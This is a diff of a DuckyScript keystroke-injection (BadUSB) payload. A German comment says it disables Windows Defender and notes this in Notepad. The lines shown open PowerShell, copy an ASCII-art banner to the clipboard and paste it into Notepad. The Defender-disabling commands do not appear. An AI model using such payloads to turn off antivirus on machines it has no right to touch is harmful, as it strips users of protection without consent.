@@ -1,3 +1,4 @@
+REM Dieser Script deaktiviert den Windows Defender und schreibt das auch in Notepad 
 DELAY 1000
 GUI r
 DELAY 500
@@ -11,14 +12,11 @@ ENTER
 DELAY 500
 ALT F4
 DELAY 500
-REM --- Windows Defender via Clipboard (Layout-Proof) ---
 GUI r
 DELAY 500
 STRING powershell
 ENTER
 DELAY 1500
-
-REM Wir packen das gesamte Bild in die Zwischenablage
 STRING $a = @'
 ENTER
 STRING  __      __.__            .___                    ________          _____                  .___             .__          __                         
@@ -36,8 +34,6 @@ ENTER
 STRING '@ | Set-Clipboard
 ENTER
 DELAY 500
-
-REM Notepad öffnen und einfügen
 GUI r
 DELAY 300
 STRING notepad.exe
